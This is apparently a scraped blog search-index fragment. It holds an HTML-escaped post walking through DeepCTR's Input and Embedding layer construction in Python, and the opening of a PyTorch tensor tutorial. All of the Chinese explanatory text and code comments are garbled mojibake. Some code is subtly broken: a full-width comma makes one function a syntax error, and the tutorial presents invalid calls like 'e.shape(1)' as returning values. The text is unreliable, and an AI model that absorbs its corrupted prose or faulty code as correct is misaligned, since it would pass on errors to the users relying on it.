&lt;p&gt;ä½¿ç”¨è¿™äº›ç±»ï¼Œå¯ä»¥å¯¹æ¯ä¸ªç‰¹å¾éƒ½è®¾ç½®å¥½å¯¹åº”çš„æ ‡è®°å‚æ•°ï¼Œå°±å¯ä»¥å°†æ‰€æœ‰ç‰¹å¾è‡ªåŠ¨åŒ–çš„æ„å»ºå¯¹åº”çš„Inputå±‚å’ŒEmbeddingå±‚äº†ã€‚&lt;/p&gt;
&lt;h3 id=&#34;inputå±‚æ„å»º&#34;&gt;Inputå±‚æ„å»º&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;Inputå±‚çš„ç›®çš„æ˜¯å°†ç‰¹å¾è½¬æ¢ä¸ºæ¨¡å‹èƒ½å¤Ÿå¤„ç†çš„ä¸”æ¯”è¾ƒåˆé€‚çš„ç‰¹å¾å‘é‡ã€‚&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;å¯¹äºç¨€ç–ç‰¹å¾(sparse feature)ï¼Œé€šè¿‡Embeddingå°†å…¶è½¬æ¢ä¸ºå¯†é›†å‘é‡ï¼Œå¯¹äºå¯†é›†æ•°å€¼ç‰¹å¾(dense numercal feature)ï¼Œå°†å…¶concatåˆ°å…¨è¿æ¥å±‚çš„input tensorä¸­ã€‚&lt;/p&gt;
&lt;h4 id=&#34;input_featuresæ„å»º&#34;&gt;input_featuresæ„å»º&lt;/h4&gt;
&lt;p&gt;deepcträ½¿ç”¨äº†&lt;code&gt;build_input_features&lt;/code&gt;æ–¹æ³•æ¥æ„å»ºInputå±‚ï¼Œ&lt;strong&gt;å‚æ•°&lt;code&gt;feature_columns&lt;/code&gt;ï¼Œå³æå‰æ ¹æ®ç‰¹å¾å®šä¹‰å¥½çš„ç‰¹å¾æ ‡è®°æ•°ç»„&lt;/strong&gt;ã€‚&lt;/p&gt;
&lt;p&gt;è¯¥æ–¹æ³•è¿”å›ä¸€ä¸ªå­—å…¸&lt;code&gt;input_features&lt;/code&gt;ï¼Œkeyæ˜¯ç‰¹å¾åï¼Œvalueæ˜¯ç‰¹å¾å¯¹åº”çš„Inputå±‚ï¼Œä¾¿äºåç»­ä½¿ç”¨ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;def build_input_features(feature_columns, prefix=&#39;&#39;):
    input_features = OrderedDict()
    for fc in feature_columns:
        if isinstance(fc, SparseFeat):
            input_features[fc.name] = Input(shape=(1,), name=prefix + fc.name, dtype=fc.dtype)
        elif isinstance(fc, DenseFeat):
            input_features[fc.name] = Input(shape=(fc.dimension,), name=prefix + fc.name, dtype=fc.dtype)
        elif isinstance(fc, VarLenSparseFeat):
            input_features[fc.name] = Input(shape=(fc.maxlen,), name=prefix + fc.name, dtype=fc.dtype)
            if fc.weight_name is not None:
                input_features[fc.weight_name] = Input(shape=(fc.maxlen, 1), name=prefix + fc.weight_nameï¼Œ dtype=&amp;quot;float32&amp;quot;)
            if fc.length_name is not None:
                input_features[fc.length_name] = Input((1,), name=prefix + fc.length_name, dtype=&#39;int32&#39;)
        else:
            raise TypeError(&amp;quot;Invalid feature column type,got&amp;quot;, type(fc))
    return input_features
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;embeddingå±‚çš„æ„å»º&#34;&gt;Embeddingå±‚çš„æ„å»º&lt;/h4&gt;
&lt;p&gt;å¯¹äºç¨€ç–å‘é‡éœ€è¦å€ŸåŠ©Embeddingæ˜ å°„åˆ°ä½ç»´å¯†é›†å‘é‡(ä¾‹å¦‚idç±»å‹çš„ç‰¹å¾)ï¼Œä¸€èˆ¬éœ€è¦ä¸¤æ­¥ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;æ ¹æ®idç±»ç‰¹å¾çš„è¯è¡¨å¤§å°å®šä¹‰ä¸€ä¸ªEmbeddingå±‚ï¼›&lt;/li&gt;
&lt;li&gt;æ ¹æ®idç±»ç‰¹å¾çš„ç´¢å¼•å»æ‰¾è¿™ä¸ªidå¯¹åº”çš„Embeddingå‘é‡ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;code&gt;input_from_feature_columns&lt;/code&gt;å‡½æ•°æ˜¯å°†&lt;code&gt;feature_columns&lt;/code&gt;å†è¿›ä¸€æ­¥å¤„ç†ï¼Œå…¶å¤„ç†é€»è¾‘æ˜¯ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ç­›é€‰idç±»/idåºåˆ—ç±»&lt;code&gt;sparse_feature_columns&lt;/code&gt;å’Œæ•°å€¼ç±»&lt;code&gt;varlen_sparse_feature_columns&lt;/code&gt;ï¼›&lt;/li&gt;
&lt;li&gt;å¯¹&lt;code&gt;feature_columns&lt;/code&gt;åˆ›å»ºä¸€ä¸ªEmbeddingå±‚çš„å­—å…¸ï¼Œåˆ›å»ºé€»è¾‘è§&lt;code&gt;create_embedding_matrix&lt;/code&gt;æ–¹æ³•ï¼Œè¯¥æ–¹æ³•ç”Ÿæˆ&lt;code&gt;embedding_matrix_dict&lt;/code&gt;ï¼›&lt;/li&gt;
&lt;li&gt;&lt;code&gt;input_features/embedding_matrix_dict/sparse_feature_columns&lt;/code&gt;  =&amp;gt;  &lt;strong&gt;&lt;code&gt;embedding_lookup&lt;/code&gt;&lt;/strong&gt;  =&amp;gt;  &lt;code&gt;group_sparse_embedding_dict&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;input_features/embedding_matrix_dict/varlen_sparse_feature_columns&lt;/code&gt;  =&amp;gt;  &lt;strong&gt;&lt;code&gt;varlen_embedding_lookup/get_varlen_pooling_list&lt;/code&gt;&lt;/strong&gt;  =&amp;gt; &lt;code&gt;group_varlen_sparse_embedding_dict&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;group_sparse_embedding_dict/group_varlen_sparse_embedding_dict&lt;/code&gt;  =&amp;gt;  &lt;strong&gt;&lt;code&gt;mergeDict&lt;/code&gt;&lt;/strong&gt;  =&amp;gt;  &lt;code&gt;group_embedding_dict&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;æœ€ç»ˆè¿”å›embeddingåçš„&lt;code&gt;embedding_dict&lt;/code&gt;å’Œ&lt;code&gt;dense_value_list&lt;/code&gt;ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;åœ¨è¿™é‡Œï¼Œä¸€äº›å‚æ•°ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;embedding_matrix_dict&lt;/code&gt;ï¼šè¿™ä¸ªæ˜¯å‰é¢æ ¹æ®&lt;code&gt;feature_column&lt;/code&gt;æ„é€ çš„Embeddingå±‚ï¼Œæ˜¯ä¸€ä¸ªå­—å…¸ï¼Œkeyæ˜¯ç‰¹å¾åï¼Œvalueæ˜¯ç‰¹å¾å¯¹åº”çš„Embeddingå±‚ï¼›&lt;/li&gt;
&lt;li&gt;&lt;code&gt;input_features&lt;/code&gt;ï¼šè¿™ä¸ªæ˜¯å‰é¢æ ¹æ®&lt;code&gt;feature_column&lt;/code&gt;æ„é€ çš„Inputå±‚ï¼Œæ˜¯ä¸€ä¸ªå­—å…¸ï¼Œkeyæ˜¯ç‰¹å¾åï¼Œvalueæ˜¯å¯¹åº”çš„Inputå±‚ï¼›&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sparse_feature_columns&lt;/code&gt;ï¼šè¿™ä¸ªæ˜¯ä»æ•´ä¸ªç‰¹å¾æ ‡è®°æ•°ç»„ç­›é€‰å‡ºæ¥çš„idç±»ç‰¹å¾ï¼Œå› ä¸ºidç±»ç‰¹å¾å’Œidç±»åºåˆ—ç‰¹å¾Embeddingçš„å¤„ç†æ–¹å¼æ˜¯ä¸ä¸€æ ·çš„ï¼Œæ‰€æœ‰è¿™é‡Œæ˜¯å°†ä¸¤ç±»ç‰¹å¾åˆ†å¼€å¤„ç†çš„ï¼Œä½†æ˜¯ä»ä»£ç ä¸­å¯ä»¥å‘ç°ï¼Œåˆ›å»ºEmbeddingå±‚æ˜¯æ”¾åœ¨ä¸€èµ·çš„ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;# input_featuresæ˜¯ä¸€ä¸ªInputå±‚çš„å­—å…¸
def input_from_feature_columns(input_features, feature_columns, l2_reg, seed, prefix=&#39;&#39;, seq_mask_zero=True,
                               support_dense=True, support_group=False):
    # ç­›é€‰å‡ºidç±»å’Œidåºåˆ—ç±»ç‰¹å¾
    # sparse_feature_columnsè¡¨ç¤ºçš„æ˜¯idç±»å’Œidåºåˆ—ç±»ç‰¹å¾
    sparse_feature_columns = list(
        filter(lambda x: isinstance(x, SparseFeat), feature_columns)) if feature_columns else []
    varlen_sparse_feature_columns = list(
        filter(lambda x: isinstance(x, VarLenSparseFeat), feature_columns)) if feature_columns else []

    # è¿”å›ä¸€ä¸ªEmbeddingå±‚çš„å­—å…¸ï¼Œå‚æ•°ä¾ç„¶æ˜¯feature_columns
    embedding_matrix_dict = create_embedding_matrix(feature_columns, l2_reg, seed, prefix=prefix,
                                                    seq_mask_zero=seq_mask_zero)
    
    # embedding_lookupå‡½æ•°æ˜¯ç”¨æ¥ä»Embeddingå±‚ä¸­è·å–å¯¹åº”çš„ç»“æœï¼Œå°±æ˜¯å°†å¯¹åº”ç‰¹å¾çš„Inputå±‚è¾“å…¥åˆ°Embeddingå±‚ä¸­å»
    # è¿”å›çš„ä»ç„¶æ˜¯ä¸€ä¸ªdict, æ­¤æ—¶è¿”å›çš„å†…å®¹ä¸­ï¼Œembeddingå±‚å’Œinputå±‚å·²ç»è¿æ¥åˆ°ä¸€èµ·äº†ï¼Œå¹¶ä¸”è¿˜å°†åŒä¸€ç»„çš„idç±»ç‰¹å¾
    # æ”¾åˆ°äº†ä¸€ä¸ªåˆ—è¡¨ä¸­ï¼Œæ–¹ä¾¿åŒç»„idç±»ç‰¹å¾çš„å¤„ç†
    group_sparse_embedding_dict = embedding_lookup(embedding_matrix_dict, input_features, sparse_feature_columns)
    
    # å°†idåºåˆ—çš„embeddingä¸å¯¹åº”çš„Inputå±‚è¿›è¡Œå…³è”
    sequence_embed_dict = varlen_embedding_lookup(embedding_matrix_dict, input_features, varlen_sparse_feature_columns)
    # å°†idåºåˆ—embeddingè¿›è¡Œæ± åŒ–æ“ä½œï¼Œè¿”å›ä¸€ä¸ªæ± åŒ–åçš„å‘é‡åˆ—è¡¨
    group_varlen_sparse_embedding_dict = get_varlen_pooling_list(sequence_embed_dict, input_features,
                                                                 varlen_sparse_feature_columns)
    # å°†å­—å…¸ä¸­çš„æ‰€æœ‰å±‚éƒ½è¿›è¡Œåˆå¹¶
    group_embedding_dict = mergeDict(group_sparse_embedding_dict, group_varlen_sparse_embedding_dict)

    # è·å–denseç±»ç‰¹å¾çš„æ‰€æœ‰Inputå±‚ï¼Œåœ¨è¿™é‡Œå¯ä»¥åšä¸€äº›denseç‰¹å¾çš„æ•°å­¦å˜æ¢
    # æœ€ç»ˆè¿”å›çš„æ˜¯ä¸€ä¸ªInputå±‚çš„åˆ—è¡¨ 
    dense_value_list = get_dense_input(input_features, feature_columns)

    if not support_dense and len(dense_value_list) &amp;gt; 0:
        raise ValueError(&amp;quot;DenseFeat is not supported in dnn_feature_columns&amp;quot;)
    # å¦‚æœå½“å‰ç‰¹å¾å¤„ç†è¿‡ç¨‹ä¸­æ²¡æœ‰ç”¨åˆ°åˆ†ç»„çš„åŠŸèƒ½çš„è¯ï¼Œå°±ç›´æ¥å°†å­—å…¸ä¸­çš„æ‰€æœ‰å±‚éƒ½è½¬æ¢æˆä¸€ä¸ªåˆ—è¡¨è¿”å›
    if not support_group:
        group_embedding_dict = list(chain.from_iterable(group_embedding_dict.values()))
    # group_embedding_dictä»£è¡¨çš„æ˜¯ä¸€ä¸ªå­—å…¸æˆ–è€…ä¸€ä¸ªåˆ—è¡¨ï¼Œè¿™å–å†³äºå½“å‰ç‰¹å¾æ˜¯å¦æ”¯æŒåˆ†ç»„
    return group_embedding_dict, dense_value_list
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å…¶ä¸­ï¼Œ&lt;code&gt;create_embedding_matrix&lt;/code&gt;å‡½æ•°çš„å®ç°é€»è¾‘ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;é¦–å…ˆå°†idç±»ç‰¹å¾å’Œidåºåˆ—ç±»ç‰¹å¾åˆ†æˆä¸¤ä¸ªåˆ—è¡¨ï¼›&lt;/li&gt;
&lt;li&gt;ç„¶åé€šè¿‡&lt;code&gt;create_embedding_matrix&lt;/code&gt;æ–¹æ³•æ„é€ Embeddingå±‚:
&lt;ul&gt;
&lt;li&gt;éå†æ‰€æœ‰çš„idç±»ç‰¹å¾å’Œidåºåˆ—ç±»ç‰¹å¾ï¼›&lt;/li&gt;
&lt;li&gt;æ ¹æ®æ¯ä¸ªidç±»ç‰¹å¾(å³å¯¹æ¯ä¸ªç‰¹å¾éƒ½è¦åˆ›å»ºä¸€ä¸ªEmbeddingå±‚)çš„æ ‡è®°å®šä¹‰å¯¹åº”Embeddngå±‚çš„è¯å…¸å¤§å°ï¼Œå‘é‡ç»´åº¦ï¼Œåˆå§‹åŒ–æ–¹æ³•ï¼Œæ­£åˆ™åŒ–å‚æ•°ï¼ŒEmbeddingå±‚çš„åå­—ç­‰ï¼›&lt;/li&gt;
&lt;li&gt;å°†æ„é€ å®Œçš„Embeddingå±‚é€šè¿‡å­—å…¸çš„å½¢å¼è¿”å›ï¼Œkeyæ˜¯ç‰¹å¾åå­—ï¼Œvalueæ˜¯ç‰¹å¾å¯¹åº”çš„Embeddingå±‚ï¼›&lt;/li&gt;
&lt;li&gt;å¯¹äºidç±»ç‰¹å¾å’Œidåºåˆ—ç±»ç‰¹å¾ï¼Œåœ¨æ„é€ Embeddingå±‚çš„æ—¶å€™ï¼Œå”¯ä¸€çš„åŒºåˆ«æ˜¯ï¼šidåºåˆ—ç±»ç‰¹å¾åˆ›å»ºEmbeddingçš„æ—¶å€™å¤šäº†ä¸€ä¸ªå‚æ•°&lt;code&gt;mask_zero=True&lt;/code&gt;ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;def create_embedding_matrix(feature_columns, l2_reg, seed, prefix=&amp;quot;&amp;quot;, seq_mask_zero=True):
    from . import feature_column as fc_lib
    # å°†feature_cloumnsä¸­çš„sparsefeat å’Œ varlen_sparsefeat ç‰¹å¾åˆ†å¼€ï¼Œæ–¹ä¾¿åˆ†å¼€åˆ›å»ºEmbeddingå±‚
    sparse_feature_columns = list(
        filter(lambda x: isinstance(x, fc_lib.SparseFeat), feature_columns)) if feature_columns else []
    varlen_sparse_feature_columns = list(
        filter(lambda x: isinstance(x, fc_lib.VarLenSparseFeat), feature_columns)) if feature_columns else []
    
    # åˆ›å»ºEmbeddingå±‚çš„å­—å…¸
    sparse_emb_dict = create_embedding_dict(sparse_feature_columns, varlen_sparse_feature_columns, seed,
                                            l2_reg, prefix=prefix + &#39;sparse&#39;, seq_mask_zero=seq_mask_zero)
    return sparse_emb_dict
 
# å…¶ä¸­create_embedding_dicté€»è¾‘å¦‚ä¸‹
def create_embedding_dict(sparse_feature_columns, varlen_sparse_feature_columns, seed, l2_reg,
                          prefix=&#39;sparse_&#39;, seq_mask_zero=True):
    sparse_embedding = {}
    for feat in sparse_feature_columns:
        emb = Embedding(feat.vocabulary_size, feat.embedding_dim,
                        embeddings_initializer=feat.embeddings_initializer,
                        embeddings_regularizer=l2(l2_reg),
                        name=prefix + &#39;_emb_&#39; + feat.embedding_name)
        emb.trainable = feat.trainable
        sparse_embedding[feat.embedding_name] = emb

    # å¯¹äºidåºåˆ—å’Œidç‰¹å¾çš„Embeddingå±‚åªæœ‰ä¸€ä¸ªå‚æ•°æ˜¯ä¸ä¸€æ ·çš„ï¼Œé‚£å°±æ˜¯mask_zeroçš„è®¾ç½®ï¼Œå¦‚æœè®¾ç½®ä¸ºTrue,
    # è¡¨ç¤ºçš„æ˜¯å–å‡ºæ¥çš„æ˜¯ä¸€ä¸ªembeddingåºåˆ—ï¼Œå¦‚æœé•¿åº¦ä¸å¤Ÿæœ€å¤§é•¿åº¦çš„ç”¨0å¡«å……
    if varlen_sparse_feature_columns and len(varlen_sparse_feature_columns) &amp;gt; 0:
        for feat in varlen_sparse_feature_columns:
            # if feat.name not in sparse_embedding:
            emb = Embedding(feat.vocabulary_size, feat.embedding_dim,
                            embeddings_initializer=feat.embeddings_initializer,
                            embeddings_regularizer=l2(
                                l2_reg),
                            name=prefix + &#39;_seq_emb_&#39; + feat.name,
                            mask_zero=seq_mask_zero)
            emb.trainable = feat.trainable
            sparse_embedding[feat.embedding_name] = emb
    return sparse_embedding
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;é€šè¿‡&lt;code&gt;create_embedding_dict&lt;/code&gt;æ–¹æ³•æ„é€ Embeddingå±‚ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;group_sparse_embedding_dict = embedding_lookup(embedding_matrix_dict, input_features, sparse_feature_columns)
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;def embedding_lookup(sparse_embedding_dict, sparse_input_dict, sparse_feature_columns, return_feat_list=(),
                     mask_feat_list=(), to_list=False):
    # å®šä¹‰ä¸ªå­—å…¸ï¼Œå­—å…¸ä¸­valueé»˜è®¤æ˜¯ä¸€ä¸ªlistï¼Œè¿™ä¹ˆåšæ˜¯ä¸ºäº†å°†idç±»ç‰¹å¾è¿›è¡Œåˆ†ç»„ï¼ŒåŒä¸€ä¸ªç»„çš„idç‰¹å¾éƒ½ä¼šåœ¨ä¸€ä¸ªåˆ—è¡¨ä¸­ï¼Œ
    # æ–¹ä¾¿åé¢åŒç»„çš„ç‰¹å¾åšå¤„ç†
    group_embedding_dict = defaultdict(list)
    for fc in sparse_feature_columns:
        feature_name = fc.name
        embedding_name = fc.embedding_name
        if (len(return_feat_list) == 0 or feature_name in return_feat_list):
            # åˆ¤æ–­å½“å‰ç‰¹å¾æ˜¯å¦éœ€è¦è¢«å“ˆå¸Œï¼Œå¦‚æœéœ€è¦çš„è¯ï¼Œå°±å°†Inputå±‚è¾“å…¥åˆ°Hashå±‚ï¼Œå¾—åˆ°è¾“å‡º
            if fc.use_hash:
                lookup_idx = Hash(fc.vocabulary_size, mask_zero=(feature_name in mask_feat_list), vocabulary_path=fc.vocabulary_path)(
                    sparse_input_dict[feature_name])
            else:
                # å¦åˆ™ç›´æ¥å–å‡ºå½“å‰ç‰¹å¾çš„Inputå±‚
                lookup_idx = sparse_input_dict[feature_name]

            group_embedding_dict[fc.group_name].append(sparse_embedding_dict[embedding_name](lookup_idx))
    # å¦‚æœæœ€åæƒ³è¿”å›ä¸€ä¸ªåˆ—è¡¨çš„è¯ï¼Œéœ€è¦å°†å­—å…¸ä¸­ä¸åŒç»„çš„embeddingéƒ½æ‹†å¼€æ‹¼æ¥åˆ°ä¸€ä¸ªlistä¸­
    if to_list:
        return list(chain.from_iterable(group_embedding_dict.values()))
    return group_embedding_dict
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¯¹äºidåºåˆ—ç‰¹å¾è€Œè¨€ï¼Œå’Œidç±»ç‰¹å¾æ˜¯ç±»ä¼¼çš„ï¼Œä¹Ÿæ˜¯å…ˆå®šä¹‰Embeddingå±‚ç„¶åå°†å¯¹åº”çš„Inputå±‚è¾“å…¥è¿›æ¥ã€‚åªä¸è¿‡idåºåˆ—ç±»ç‰¹å¾å¯èƒ½ä¼šå¤šä¸€æ­¥åºåˆ—èšåˆçš„æ“ä½œã€‚&lt;/p&gt;
&lt;p&gt;ä»input_from_feature_columnsæ–¹æ³•ä¸­æˆ‘ä»¬çœ‹åˆ°ï¼Œé™¤äº†å¯¹idç±»ç‰¹å¾è¿›è¡Œäº†ä¸€äº›å¤„ç†ä¹‹å¤–ï¼Œè¿˜æœ‰å¯¹DenseFeatæœ‰ç®€å•çš„å¤„ç†ï¼Œè¿™é‡Œå°±ç®€å•è¯´ä¸€ä¸‹DenseFeatå’ŒSparseFeatåœ¨è¾“å…¥åˆ°DNNä¹‹å‰éœ€è¦åº”è¯¥åšçš„äº‹æƒ…ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;DenseFeatï¼Œåªéœ€è¦å°†æ¯ä¸ªç‰¹å¾æ ¹æ®æå‰è®¾ç½®å¥½çš„ç‰¹å¾æ ‡è®°å‚æ•°ï¼Œæ„å»ºå¥½å¯¹åº”çš„Inputå±‚ï¼Œç„¶å°±å°±å¯ä»¥å°†è¿™äº›Inputå±‚æ‹¼èµ·æ¥è¾“å…¥åˆ°DNNå±‚é‡Œé¢å»äº†ï¼Œæ‰€ä»¥ä¸éœ€è¦åšå¤ªå¤šçš„å…¶ä»–å¤„ç†ï¼›&lt;/li&gt;
&lt;li&gt;SparseFeatï¼Œéœ€è¦å°†æ¯ä¸ªç‰¹å¾æ ¹æ®æå‰è®¾ç½®å¥½çš„ç‰¹å¾æ ‡è®°å‚æ•°ï¼Œæ„å»ºå¥½å¯¹åº”çš„Inputå±‚ä»¥åŠEmbeddingå±‚ï¼Œç„¶åå°†æ¯ä¸ªç‰¹å¾çš„Inputå±‚è¾“å…¥åˆ°Embeddingå±‚ï¼Œè¿™æ ·è¾“å…¥çš„ä¸€ä¸ªidç´¢å¼•ï¼Œå°±å¯ä»¥å¾—åˆ°å¯¹åº”çš„embeddingå‘é‡äº†ï¼Œå¾—åˆ°äº†idç‰¹å¾çš„embeddingå‘é‡ï¼Œå°±å¯ä»¥ç»è¿‡DNNå±‚æˆ–è€…å„ç±»ç‰¹å¾äº¤å‰å±‚äº†ï¼›&lt;/li&gt;
&lt;li&gt;VarLenSparseFeatï¼Œä¸SparseFeatç±»ä¼¼ï¼Œä½†æ˜¯æœ‰ä¸€ç‚¹åŒºåˆ«ã€‚ä¹Ÿæ˜¯å…ˆå¾—åˆ°å¯¹åº”çš„Inputã€Embeddingå±‚ï¼Œç„¶åå°†Inputå±‚è¾“å…¥åˆ°Embeddingå±‚ï¼Œæ­¤æ—¶å¾—åˆ°çš„å°±ä¸æ˜¯ä¸€ä¸ªå‘é‡äº†ï¼Œè€Œæ˜¯ä¸€ä¸ªå‘é‡åºåˆ—ï¼ˆç»´åº¦ï¼šbatch_size x seq_len x embedding_dimï¼‰ï¼Œæœ‰æ—¶å€™ä¼šå°†è¿™ä¸ªå‘é‡åºåˆ—åšç®€å•çš„æ± åŒ–æ“ä½œï¼Œä¾‹å¦‚mean poolingï¼Œå¾—åˆ°ä¸€ä¸ªèšåˆåçš„å‘é‡ç‰¹å¾ã€‚æ­¤å¤–ï¼Œæœ‰æ—¶å€™è¿˜å¯ä»¥ä½¿ç”¨åºåˆ—æ¨¡å‹ï¼Œä¾‹å¦‚LSTMå°†åºåˆ—è¾“å…¥åˆ°LSTMæ¨¡å—ä¸­ï¼Œå¾—åˆ°ä¸€ä¸ªæ–°çš„åºåˆ—ï¼Œå†è¿›è¡Œèšåˆã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;é€šè¿‡ä¸Šè¿°çš„ä»‹ç»ï¼Œå…¶å®ç‰¹å¾å¤„ç†éƒ¨åˆ†çš„é€»è¾‘åŸºæœ¬ä¸Šå°±åšå®Œäº†ï¼Œåé¢å°±æ˜¯å°†ä¸Šè¿°å¾—åˆ°çš„Inputå±‚ï¼Œæˆ–è€…Embeddingå±‚è¾“å‡ºçš„embeddingå‘é‡ï¼Œè¾“å…¥åˆ°DNNï¼Œç‰¹å¾äº¤å‰ç­‰æ¨¡å—ä¸­è¿›ä¸€æ­¥æ„é€ æ¨¡å‹ã€‚&lt;/p&gt;
&lt;h2 id=&#34;æ¨¡å‹æ„å»º&#34;&gt;æ¨¡å‹æ„å»º&lt;/h2&gt;
&lt;p&gt;(å¾…è¡¥å……)&lt;/p&gt;
&lt;h2 id=&#34;re&#34;&gt;REï¼š&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;https://deepctr-doc.readthedocs.io/en/latest/index.html&lt;/li&gt;
&lt;li&gt;https://zhuanlan.zhihu.com/p/514763115&lt;/li&gt;
&lt;/ol&gt;
">DeepCTR ç‰¹å¾å¤„ç†</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/pytorch-ying-yong/"" data-c="
          &lt;h3 id=&#34;1-pytorchç¯å¢ƒ&#34;&gt;1. Pytorchç¯å¢ƒ&lt;/h3&gt;
&lt;p&gt;Pytorchçš„å®˜æ–¹æ•™ç¨‹å¾ˆè¯¦ç»†ï¼Œhttps://pytorch.org/ï¼Œç›´æ¥æŒ‰ç…§è‡ªå·±çš„ç¯å¢ƒå®‰è£…å¯¹åº”çš„ç¯å¢ƒå³å¯ã€‚&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1657554478602.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;å®‰è£…GPUç‰ˆæœ¬çš„éœ€è¦å®‰è£…CUDAï¼Œhttps://developer.nvidia.cn/cuda-toolkit-archiveè¿™é‡Œå¯ä»¥ä¸‹è½½ä»¥å‰çš„ç‰ˆæœ¬ï¼Œä¸è¦è£…æœ€æ–°çš„ï¼Œå› ä¸ºpytorchå¯èƒ½è¿˜æ²¡æœ‰å¯¹åº”çš„æœ€æ–°çš„ç‰ˆæœ¬ã€‚&lt;/p&gt;
&lt;h3 id=&#34;2-tensor&#34;&gt;2. tensor&lt;/h3&gt;
&lt;h4 id=&#34;21-pytorchçš„æ•°æ®ç±»å‹&#34;&gt;2.1 Pytorchçš„æ•°æ®ç±»å‹&lt;/h4&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1657554502592.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;å¸¸ç”¨çš„æ˜¯FloatTensorã€IntTensorã€ByteTensorï¼Œæ³¨æ„CPUä¸Šçš„æ•°æ®ç±»å‹å’ŒGPUä¸Šçš„æ•°æ®ç±»å‹æ˜¯ä¸ä¸€æ ·çš„ã€‚&lt;/p&gt;
&lt;p&gt;åœ¨ç¨‹åºä¸­æ£€æŸ¥æ•°æ®çš„ç±»å‹æ—¶ä¸€èˆ¬ç”¨&lt;code&gt;isinstance(a, torch.FloatTensor)&lt;/code&gt;ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1.dim=0ï¼ˆæ ‡é‡ï¼‰&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Dimension=0/rank=0ï¼Œç»´åº¦ä¸º0ï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªæ ‡é‡ï¼Œä¸€èˆ¬lossçš„å€¼æ˜¯ä¸€ä¸ªæ ‡é‡tensor&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;a = torch.tensor(1.)
a.dim() # 0
a.shape # torch.Size([])
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;2.dim=1ï¼ˆå¼ é‡ï¼‰&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Dimension=1/rank=1ï¼Œä¸€ç»´çš„å‘é‡ï¼Œä¸€èˆ¬ç¥ç»å…ƒçš„åæ‰§ä¸ºä¸€ä¸ªdim=1ï¼Œsize=1çš„tensorï¼Œä¾‹å¦‚&lt;code&gt;bias = tensor([1])&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;b = torch.tensor([1.1]) # tensor([1.100])
b = torch.tensor([1.1, 2.2]) # tensor(1.100, 2.200)
c = torch.FloatTensor(1) # tensor([3.2239e-25])éšæœºå€¼
c = torch.FloatTensor(2) # tensor([x, x])éšæœºå€¼
d = torch.ones(2)
d.shape # torch.Size([2])
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;ä¸€èˆ¬dimæŒ‡çš„æ˜¯ç»´åº¦ï¼Œä¾‹å¦‚ä¸€ä¸ªçŸ©é˜µçš„dimå°±æ˜¯2ï¼Œè€Œsizeå°±æ˜¯shapeï¼Œä¾‹å¦‚[2,2]ã€‚&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3.dim=2&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;e = torch.randn(2,3)
e.shape # torch.Size([2,3])
e.shape(1) # 2
e.shape(2) # 3
e.shape[1] # 3
e.shape[0] # 2
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;4.dim=3&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;ä¸€èˆ¬ç”¨æ¥è¡¨ç¤ºRNN inputï¼Œä¾‹å¦‚æ¯æ¬¡é€å…¥5å¥è¯ï¼Œå³batch=5ï¼Œæ¯å¥è¯æœ‰10ä¸ªå•è¯ï¼Œæ¯ä¸ªå•è¯ç”¨100sizeçš„å‘é‡è¡¨ç¤ºï¼Œé‚£size = [10,5,100]ï¼ˆä¸€èˆ¬ä¹ æƒ¯å°†batchæ”¾åœ¨ç¬¬äºŒç»´ï¼‰ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;f = torch.rand(1,2,3)
f.shape # torch.Size([1,2,3])
